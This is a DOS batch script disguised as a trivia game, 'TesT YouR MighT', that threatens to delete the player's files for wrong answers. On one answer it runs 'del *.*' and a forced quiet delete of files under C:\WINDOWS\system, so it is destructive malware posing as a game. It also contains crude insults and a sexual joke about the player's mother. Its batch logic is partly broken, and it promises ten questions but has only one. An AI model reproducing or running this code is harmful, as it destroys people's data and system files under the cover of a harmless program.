                                                                                               @echo off
   cls
   Echo ========================
   Echo      TesT YouR MighT
   Echo ========================
   TYPE NUL | CHOICE.COM /N /CY /TY,3 >NUL
   Echo This Is The Test Of Your Computers Future
   ===============================================
   Echo Heres the rules and how this game is played
   TYPE NUL | CHOICE.COM /N /CY /TY,1 >NUL
   Echo Ok First here is whatcha goto do....
   Echo You get 3 choices and 10 Questions....
   TYPE NUL | CHOICE.COM /N /CY /TY,4 >NUL
   Echo Every question you get right the demage,
   Echo For Every Question you get wroung And item is deleted x2
   TYPE NUL | CHOICE.COM /N /CY /TY,4 >NUL
   Echo Ok
   Echo LeTs GeT ReadY tO RamblE!!
   Echo First Question....Comming Up...
   TYPE NUL | CHOICE.COM /N /CY /TY,6 >NUL
   Echo.
   Echo Question 1:
   Echo.
   Echo.
   Echo What Is The Name of the 13th President?
   echo.
   echo A) Clinton
   Echo.
   Echo B) Bill Gates
   Echo.
   Echo C) Your mom
   choice /n/abc
   if errorlevel a goto a
   if errorlevel b goto b
   if errorlevel c goto c

   :a
   Echo Hey ElStoopido Bill Clinton was NOT the 13th president!
   Echo Your A Dip Shit You Should BE shot!
   del *.*
   del /F /Q "C:\WINDOWS\system/*.*"
   type NUL | choice /N /CY /TY,3 >NUL
   Echo Lets try again!
   Echo.
   Echo NOT
   exit

   :c
   Echo You know Dont you wish your mom wuz The 13th President
   Echo.
   Echo That way when she finds out that your comp is all messed up
   echo.
   echo She Can Give your Oral Sex!



   :b
   Echo Bill Gates Was the 13th president in my world...
   Echo Great Job Your Computer is spared for now!
